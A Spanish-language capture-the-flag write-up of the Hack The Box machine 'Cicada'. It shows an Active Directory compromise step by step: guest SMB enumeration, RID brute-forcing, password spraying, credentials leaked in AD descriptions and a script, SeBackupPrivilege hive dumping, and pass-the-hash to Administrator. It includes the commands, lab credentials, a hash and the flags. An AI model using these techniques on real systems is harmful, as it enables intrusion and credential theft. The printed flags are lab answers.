---
tags:
  - asset/active-directory
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/627
dificultad: Fácil
ip: 10.10.11.35
os: Windows
relacionados:
  - "[[SMB Enumeration]]"
  - "[[RID Brute with Netexec for Potential User Discovery]]"
  - "[[Information Leakage through Rpcclient (querydispinfo)]]"
  - "[[Abusing SeBackupPrivilege]]"
  - "[[Pass-the-Hash Atack]]"
---
# HackTheBox - Cicada

## Reconocimiento

### Escaneo con Nmap

Mi primer paso fue realizar un escaneo con `Nmap` para identificar los servicios expuestos en la máquina. Los resultados mostraron puertos clave como `88` (Kerberos) y `389` (LDAP), lo que me confirmó que estaba frente a un Controlador de Dominio de Windows. El escaneo también reveló el nombre de dominio, **cicada.htb**, y el hostname, **CICADA-DC**.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 01_Reconnaissance/tcpports

nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,51996 $(cat ip) --version-all --script-timeout 30s -oN 01_Reconnaissance/sCV
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-07 11:59 EET
Nmap scan report for 10.10.11.35
Host is up (0.094s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT STATE SERVICE VERSION
53/tcp open domain Simple DNS Plus
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-07
16:59:36Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain:
cicada.htb0., Site: Default-First-Site-Name)
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain:
cicada.htb0., Site: Default-First-Site-Name)
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain:
cicada.htb0., Site: Default-First-Site-Name)
3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain:
cicada.htb0., Site: Default-First-Site-Name)
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Para facilitar la interacción con el dominio, agregué la entrada correspondiente a mi archivo `/etc/hosts`.
```Bash
echo "10.10.11.35 cicada.htb" | sudo tee -a /etc/hosts
```


---

## Explotación de vulnerabilidades

### Enumeración de SMB y Descubrimiento de Credenciales

Al no haber una interfaz web, mi siguiente objetivo fue el servicio SMB (puerto `445`). Intenté enumerar los recursos compartidos de forma anónima con `crackmapexec`, pero se me denegó el acceso.
```Bash
netexec smb cicada.htb --shares
```

```
SMB cicada.htb 445 CICADA-DC [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
```

Sin embargo, probé con el usuario `guest` sin contraseña y tuve éxito. Pude listar varios recursos compartidos, entre los cuales `HR` tenía permisos de lectura.
```Bash
netexec smb cicada.htb -u 'guest' -p '' --shares
```

```
SMB cicada.htb 445 CICADA-DC [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB cicada.htb 445 CICADA-DC [+] cicada.htb\guest:
SMB cicada.htb 445 CICADA-DC [+] Enumerated shares
SMB cicada.htb 445 CICADA-DC Share Permissions Remark
SMB cicada.htb 445 CICADA-DC ----- ----------- ------
SMB cicada.htb 445 CICADA-DC ADMIN$ Remote Admin
SMB cicada.htb 445 CICADA-DC C$ Default share
SMB cicada.htb 445 CICADA-DC DEV
SMB cicada.htb 445 CICADA-DC HR READ
SMB cicada.htb 445 CICADA-DC IPC$ READ Remote IPC
SMB cicada.htb 445 CICADA-DC NETLOGON Logon server share
SMB cicada.htb 445 CICADA-DC SYSVOL Logon server share
```

Utilicé `smbclient` para conectarme al recurso `HR` y encontré un archivo de texto interesante: `Notice from HR.txt`.
```Bash
smbclient //cicada.htb/HR -U 'guest%'
```

```
smb: \> dir
  .                                   D        0  Thu Mar 14 14:29:09 2024
  ..                                  D        0  Thu Mar 14 14:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 20:31:48 2024

smb: \> get "Notice from HR.txt"
```

Al revisar el archivo, descubrí una contraseña por defecto proporcionada a los nuevos empleados.

> [!note] Contraseña por Defecto Descubierta
> 
> El archivo contenía una contraseña genérica: Cicada$M6Corpb*@Lp#nZp!8. Este es un hallazgo crítico, ya que es común que estas contraseñas no se cambien.

### Password Spraying

Con una contraseña en mi poder, necesitaba una lista de usuarios del dominio para probarla. Usando el acceso como `guest`, utilicé el script `lookupsid.py` de Impacket para enumerar los usuarios del dominio a través de la fuerza bruta de SIDs.
```Bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
```
o 
```bash
netexec smb $(cat ip) -u 'guest' -p '' --rid-brute
```

Filtré la salida para quedarme únicamente con los usuarios y los guardé en un archivo `users.txt`.
```Bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
```

```
cat users.txt
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

Luego, realicé un ataque de **Password Spraying** con `crackmapexec`, probando la contraseña encontrada contra toda la lista de usuarios.
```Bash
netexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

> [!SUCCESS] ¡Credenciales Válidas!
> 
> El ataque reveló que el usuario michael.wrightson todavía utilizaba la contraseña por defecto.
> 
> SMB cicada.htb 445 CICADA-DC [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8

### Pivotando y Encontrando Más Credenciales

Con las credenciales de `michael.wrightson`, volví a enumerar los usuarios del dominio, esta vez buscando más detalles como sus descripciones en Active Directory.
```Bash
netexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

> [!IMPORTANT] Fuga de Credenciales en la Descripción de AD
> 
> ¡Increíblemente, la descripción del usuario david.orelious contenía su contraseña en texto plano!
> 
> cicada.htb\david.orelious badpwdcount: 1 desc: Just in case I forget my password is aRt$Lp#7t*VQ!3

Con las credenciales de `david.orelious`, enumeré nuevamente los recursos compartidos y descubrí que tenía acceso de lectura al share `DEV`.
```Bash
netexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```

Dentro de `DEV`, encontré un script de PowerShell llamado `Backup_script.ps1`.
```Bash
smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
smb: \> get Backup_script.ps1
```

Al analizar el script, encontré otro par de credenciales codificadas en texto plano.

> [!note] Credenciales Expuestas en Script
> 
> El script contenía el usuario emily.oscars y su contraseña Q!3@Lp#M6b*7t*Vt. Esta es una mala práctica de seguridad muy común que expone credenciales críticas.
> 
> PowerShell
> 
> ```
> $username = "emily.oscars"
> $password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
> ```

### Obteniendo Acceso Inicial (Foothold)

Utilicé las credenciales de `emily.oscars` con `Evil-WinRM` para obtener una sesión interactiva en la máquina.
```Bash
evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb
```

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
```

Con esto, obtuve mi acceso inicial (foothold) al sistema y pude capturar la bandera de usuario en el escritorio de Emily.


---

## Escalada de privilegios

### Abuso del Privilegio SeBackupPrivilege

Una vez dentro como `emily.oscars`, mi primer paso fue verificar sus privilegios con el comando `whoami /priv`.
```PowerShell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv
```

```
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
...
```

El privilegio `SeBackupPrivilege` estaba habilitado. Este privilegio es extremadamente poderoso, ya que permite leer cualquier archivo del sistema, sin importar los permisos (ACLs) que tenga. Esto me daba una vía directa para acceder a los archivos del registro de Windows más sensibles: **SAM** y **SYSTEM**.

Usando el comando `reg save`, hice una copia de estos hives del registro en el directorio actual.
```PowerShell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\sam sam
The operation completed successfully.
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\system system
The operation completed successfully.
```

Luego, descargué ambos archivos a mi máquina local usando la funcionalidad de `Evil-WinRM`.
```Bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download sam
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download system
```

### Pass-the-Hash (PtH)

Con los archivos SAM y SYSTEM en mi poder, utilicé `secretsdump.py` de Impacket para extraer los hashes NTLM de las cuentas locales.
```Bash
impacket-secretsdump -sam sam -system system local
```

> [!SUCCESS] Hash NTLM del Administrador Obtenido
> 
> La herramienta extrajo con éxito los hashes, incluyendo el del usuario Administrator.
> 
> Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::

En lugar de intentar crackear el hash, realicé un ataque **Pass-the-Hash (PtH)**. Este ataque me permite autenticarme directamente usando el hash NTLM en lugar de la contraseña en texto plano.

Utilicé `Evil-WinRM` nuevamente, pero esta vez con el flag `-H` para pasar el hash del Administrador.
```Bash
evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
```

```
Evil-WinRM shell v3.5
...
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

El ataque fue exitoso, y obtuve una sesión con privilegios de Administrador. Navegué a su escritorio y capturé la bandera de root, completando así la máquina.


---

## Bandera(s)

> [!flag] `flag{user}`
> 1bdbd3ffed7d7cb2416dd5073e4c63e3
^bandera-user

> [!flag] `flag{root}`
> e123c58bbb91d01f97a8f13fc2907b93
^bandera-root
